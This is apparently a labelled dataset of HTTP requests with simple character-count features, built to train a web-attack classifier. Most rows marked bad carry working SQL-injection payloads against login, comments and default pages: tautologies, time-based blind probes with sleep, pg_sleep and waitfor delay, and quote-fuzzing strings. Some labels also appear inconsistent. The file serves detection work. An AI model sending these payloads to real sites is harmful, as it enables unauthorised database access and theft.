method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/comments.aspx?id=1%20AND%203*2*1=6%20AND%20414=414,,0,0,0,0,4,0,bad
GET,/comments.aspx?id=1%20AND%203*2*1=6%20AND%2068=68,,0,0,0,0,4,0,bad
GET,/comments.aspx?id=1%20AND%205*4=20%20AND%20414=414,,0,0,0,0,4,0,bad
GET,/comments.aspx?id=1%20AND%205*4=20%20AND%2068=68,,0,0,0,0,4,0,bad
GET,/comments.aspx?id=1%20AND%205*4=21%20AND%20414=414,,0,0,0,0,4,0,bad
GET,/comments.aspx?id=1%20AND%205*4=21%20AND%2068=68,,0,0,0,0,4,0,bad
GET,/comments.aspx?id=1%20AND%205*6<26%20AND%20414=414,,0,0,0,0,4,0,bad
GET,/comments.aspx?id=1%20AND%205*6<26%20AND%2068=68,,0,0,0,0,4,0,bad
GET,/comments.aspx?id=1%20AND%207*7>48%20AND%20414=414,,0,0,0,0,4,0,bad
GET,/comments.aspx?id=1%20AND%207*7>48%20AND%2068=68,,0,0,0,0,4,0,bad
GET,/comments.aspx?id=1*1*1,,0,0,0,0,0,0,bad
GET,/comments.aspx?id=1*1*1*1,,0,0,0,0,0,0,bad
GET,/comments.aspx?id=1*1*1*1*1*1,,0,0,0,0,0,0,bad
GET,/comments.aspx?id=1*414*409*0,,0,0,0,0,0,0,bad
GET,/comments.aspx?id=1*68*63*0,,0,0,0,0,0,0,bad
GET,/comments.aspx?id=11*1*1*0*1*1*414,,0,0,0,0,0,0,bad
GET,/comments.aspx?id=11*1*1*0*1*1*68,,0,0,0,0,0,0,bad
GET,/comments.aspx?id=11*5*2*999,,0,0,0,0,0,0,bad
GET,/comments.aspx?id=1acucboMV535Fe,,0,0,0,0,0,0,bad
GET,"/comments.aspx?id=1ACUSTART'""YuKEEACUEND",,1,1,0,0,0,0,bad
GET,/comments.aspx?id=nBsxuKHN,,0,0,0,0,0,0,bad
GET,/Connections,,0,0,0,0,0,0,good
GET,/Connections/,,0,0,0,0,0,0,good
GET,/Connections/DB_Connection.php,,0,0,0,0,0,0,good
POST,/contact,address=3137%20Laguna%20Street&firstName=nbertrqc&lastName=rxfdvryg&message=20&subject=product,0,0,0,0,2,0,good
POST,/contact,address=3137%20Laguna%20Street&firstName=pqhvriui&lastName=paqwgkvl&message=20&subject=na,0,0,0,0,2,0,good
POST,/contact,address=3137%20Laguna%20Street&firstName=xucntvod&lastName=tlscmcmb&message=20&subject=service,0,0,0,0,2,0,good
GET,/contact,,0,0,0,0,0,0,good
POST,/contact,address=3137%20Laguna%20Street&firstName=fkoxhtpi&lastName=vhqojwox&message=20&subject=suggestions,0,0,0,0,2,0,good
GET,/crossdomain.xml,,0,0,0,0,0,0,good
GET,/CVS,,0,0,0,0,0,0,good
GET,/CVS/,,0,0,0,0,0,0,good
GET,/CVS/Entries,,0,0,0,0,0,0,good
GET,/CVS/Entries.Log,,0,0,0,0,0,0,good
GET,/CVS/Repository,,0,0,0,0,0,0,good
GET,/CVS/Root,,0,0,0,0,0,0,good
GET,/database_connect.php,,0,0,0,0,0,0,good
GET,/default.aspx,,0,0,0,0,0,0,bad
POST,/default.aspx,__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWVwLpus/wCAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewMJcHF81eO2cQeJ9GIoRbEv7cDl44=&__VIEWSTATE=/wEPDwUKLTEwNTI0MjkwNQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkZArjxDMCoNA8/4bzlRmUHIna4LG5&__VIEWSTATEGENERATOR=CA0B0334,0,0,0,0,0,0,bad
POST,/default.aspx,__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWVwLpus/wCAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewMJcHF81eO2cQeJ9GIoRbEv7cDl44=&__VIEWSTATE=/wEPDwUKLTEwNTI0MjkwNQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkZArjxDMCoNA8/4bzlRmUHIna4LG5&__VIEWSTATEGENERATOR=CA0B0334,0,0,0,0,0,0,good
GET,"/default.aspx?delete=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'""%2b(select(0)from(select(sleep(3)))v)%2b""*/",,2,2,0,15,0,9,bad
GET,"/default.aspx?delete=0""XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR""Z",,0,2,0,5,0,1,bad
GET,/default.aspx?delete=0'XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR'Z,,2,0,0,5,0,1,bad
GET,/default.aspx?delete=1,,0,0,0,0,0,0,bad
GET,"/default.aspx?delete=-1""%20OR%202%2b833-833-1=0%2b0%2b0%2b1%20--%20",,0,1,1,0,4,0,bad
GET,/default.aspx?delete=-1%20OR%202%2b220-220-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,bad
GET,/default.aspx?delete=-1%20OR%202%2b292-292-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,bad
GET,/default.aspx?delete=-1'%20OR%202%2b549-549-1=0%2b0%2b0%2b1%20or%20'xVRm63Ns'=',,4,0,0,0,4,0,bad
GET,/default.aspx?delete=-1'%20OR%202%2b800-800-1=0%2b0%2b0%2b1%20--%20,,1,0,1,0,4,0,bad
GET,/default.aspx?delete=1%20waitfor%20delay%20'0:0:6'%20--%20,,2,0,1,0,5,2,bad
GET,/default.aspx?delete=-1));%20waitfor%20delay%20'0:0:3'%20--%20,,2,0,1,0,5,2,bad
GET,/default.aspx?delete=-1));select%20pg_sleep(3);%20--%20,,0,0,1,1,3,2,bad
GET,/default.aspx?delete=-1);%20waitfor%20delay%20'0:0:9'%20--%20,,2,0,1,0,5,2,bad
GET,/default.aspx?delete=-1);select%20pg_sleep(3);%20--%20,,0,0,1,1,3,2,bad
GET,/default.aspx?delete=-1;%20waitfor%20delay%20'0:0:6'%20--%20,,2,0,1,0,5,2,bad
GET,/default.aspx?delete=-1;select%20pg_sleep(9);%20--%20,,0,0,1,1,3,2,bad
POST,/default.aspx?delete=1acu6xmhLVOuOU,__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWVwLpus/wCAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK+ZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewMJcHF81eO2cQeJ9GIoRbEv7cDl44=&__VIEWSTATE=/wEPDwUKLTEwNTI0MjkwNQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkZArjxDMCoNA8/4bzlRmUHIna4LG5&__VIEWSTATEGENERATOR=CA0B0334,0,0,0,0,1,0,bad
GET,"/default.aspx?delete=1ACUSTART'""UxiSTACUEND",,1,1,0,0,0,0,bad
GET,/default.aspx?delete=1ACUSTART%20ACUEND,,0,0,0,0,1,0,bad
GET,/default.aspx?delete=1ACUSTART%5c,,0,0,0,0,0,0,bad
GET,/default.aspx?delete=1acuUwLJ67T9ad,,0,0,0,0,0,0,bad
GET,/default.aspx?delete=8qMnys2J';%20waitfor%20delay%20'0:0:9'%20--%20,,3,0,1,0,5,2,bad
GET,/default.aspx?delete=9Fm3Rytt'));%20waitfor%20delay%20'0:0:9'%20--%20,,3,0,1,0,5,2,bad
GET,/default.aspx?delete=idMWMBQQ');%20waitfor%20delay%20'0:0:3'%20--%20,,3,0,1,0,5,2,bad
GET,/default.aspx?delete=if(now()=sysdate()%2csleep(6)%2c0),,0,0,0,4,0,1,bad
GET,/default.aspx?delete=kfD0wypM,,0,0,0,0,0,0,bad
GET,/default.aspx?delete=mFY72S0q';select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,bad
GET,/default.aspx?delete=O4QmZPkM'));select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,bad
GET,/default.aspx?delete=RL86lf1u');select%20pg_sleep(0);%20--%20,,1,0,1,1,3,2,bad
GET,/disclaimer.php,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1,0,0,0,0,0,1,good
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2=6%20AND%20527=527%20or%20'oOPOjXva'='&uid=1,4,0,0,0,6,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1'%20OR%202%2b230-230-1=0%2b0%2b0%2b1%20or%20'naMQw5J7'=',4,0,0,0,4,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1,0,0,0,0,0,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1%20OR%202%2b204-204-1=0%2b0%2b0%2b1,0,0,0,0,2,1,bad
POST,/doLogin,btnSubmit=Login&passw=-1%20OR%202%2b522-522-1=0%2b0%2b0%2b1&uid=1,0,0,0,0,2,1,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*0=6%20AND%20527=527%20or%20'oOPOjXva'='&uid=1,4,0,0,0,6,1,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2>(0%2b5%2b527-527)%20or%20'oOPOjXva'='&uid=1,4,0,0,1,4,1,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2<(0%2b5%2b910-910)%20or%20'6N78EPpD'='&uid=1,4,0,0,1,4,1,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b527-527-1=0%2b0%2b0%2b1%20or%20'oOPOjXva'='&uid=1,4,0,0,0,4,1,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%20000910=000910%20AND%203%2b1-1-1=1%20or%20'6N78EPpD'='&uid=1,4,0,0,0,6,1,bad
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%f0''%f0""""",2,2,0,0,0,1,bad
POST,/doLogin,btnSubmit=Login&passw=%5c&uid=1,0,0,0,0,0,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1'%20OR%202%2b609-609-1=0%2b0%2b0%2b1%20--%20,1,0,1,0,4,1,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b264-264-1=0%2b0%2b0%2b1%20--%20&uid=1,1,0,1,0,4,1,bad
POST,/doLogin,btnSubmit=Login&passw=%40%40hCmP7&uid=1,0,0,0,0,0,1,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b910-910-1=0%2b0%2b0%2b1%20or%20'6N78EPpD'='&uid=1,4,0,0,0,4,1,bad
POST,/doLogin,"btnSubmit=Login&passw=1'""&uid=1",1,1,0,0,0,1,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203%2b910-910-1=0%2b0%2b0%2b1%20or%20'6N78EPpD'='&uid=1,4,0,0,0,4,1,bad
POST,/doLogin,btnSubmit=Login&passw=JyI=&uid=1,0,0,0,0,0,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1%00%c0%a7%c0%a2%252527%252522,0,0,0,0,0,1,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2=6%20AND%20000910=000910%20or%20'6N78EPpD'='&uid=1,4,0,0,0,6,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1;%20waitfor%20delay%20'0:0:9'%20--%20,2,0,1,0,5,3,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*1=6%20AND%20527=527%20or%20'oOPOjXva'='&uid=1,4,0,0,0,6,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1);select%20pg_sleep(3);%20--%20,0,0,1,1,3,3,bad
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=0""XOR(if(now()=sysdate()%2csleep(6)%2c0))XOR""Z",0,2,0,5,0,2,bad
POST,/doLogin,btnSubmit=Login&passw=-1%20OR%202%2b504-504-1=0%2b0%2b0%2b1%20--%20&uid=1,0,0,1,0,4,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%40%40GOt2p,0,0,0,0,0,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=dA0Dq5Eg');select%20pg_sleep(9);%20--%20,1,0,1,1,3,3,bad
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'""%2b(select(0)from(select(sleep(6)))v)%2b""*/",2,2,0,15,0,10,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2<(0%2b5%2b527-527)%20or%20'oOPOjXva'='&uid=1,4,0,0,1,4,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%5c,0,0,0,0,0,1,bad
GET,/doLogin,,0,0,0,0,0,2,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2=5%20AND%20527=527%20or%20'oOPOjXva'='&uid=1,4,0,0,0,6,1,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b1-1-1=1%20AND%20527=527%20or%20'oOPOjXva'='&uid=1,4,0,0,0,6,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%2524%2524w0rD&uid=1,0,0,0,0,0,1,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203%2b527-527-1=0%2b0%2b0%2b1%20or%20'oOPOjXva'='&uid=1,4,0,0,0,4,1,bad
POST,/doLogin,"btnSubmit=Login&passw=%f0''%f0""""&uid=1",2,2,0,0,0,1,bad
